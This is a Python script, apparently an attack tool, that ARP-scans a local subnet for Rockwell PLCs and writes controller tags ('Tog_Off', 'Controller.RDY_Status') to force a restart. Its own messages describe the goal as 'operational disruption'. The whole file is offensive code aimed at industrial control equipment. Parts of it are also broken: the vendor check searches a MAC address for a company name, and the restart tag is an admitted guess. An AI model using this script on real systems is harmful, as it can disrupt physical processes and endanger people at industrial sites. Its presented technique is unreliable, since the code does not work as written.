import time
import socket
from scapy.all import ARP, Ether, srp
from pylogix import PLC

# Function to scan the network and find available Rockwell devices
def discover_plc():
    target_ip = "192.168.1.1/24"  # Adjust based on your subnet
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
    answered, _ = srp(request, timeout=2, verbose=False)

    for sent, received in answered:
        if "Rockwell Automation" in received.hwsrc:  # Filter Rockwell devices based on MAC vendor (optional)
            return received.psrc  # Return the discovered Rockwell PLC's IP address
    
    return None  # No PLC found

# Function to restart the PLC
def restart_plc(ip_address):
    with PLC() as comm:
        comm.IPAddress = ip_address
        
        # Method 1: Modify a critical tag to cause a restart (e.g., setting a reboot flag)
        try:
            response = comm.Write("Tog_Off", True)  # Example of causing an unexpected device state
            if response.Status == "Success":
                print("[+] Tog_Off tag modified. This might cause an operational disruption.")
            else:
                print("[-] Failed to modify Tog_Off tag.")

            # Method 2: Direct Known Restart Command (Micro850 Special Services)
            response = comm.Write("Controller.RDY_Status", 0)  # Assuming RDY_Status exists and resets to cause a reboot
            if response.Status == "Success":
                print("[+] PLC Restart command sent successfully.")
            else:
                print("[-] Failed to restart PLC.")

        except Exception as e:
            print(f"Error while communicating with PLC: {e}")

# Main execution flow
if __name__ == "__main__":
    print("[*] Searching for Rockwell PLC on the network...")
    plc_ip = discover_plc()

    if plc_ip:
        print(f"[+] PLC found at {plc_ip}")
        print("[*] Attempting to restart the PLC...")
        restart_plc(plc_ip)
    else:
        print("[-] No PLC detected on the network.")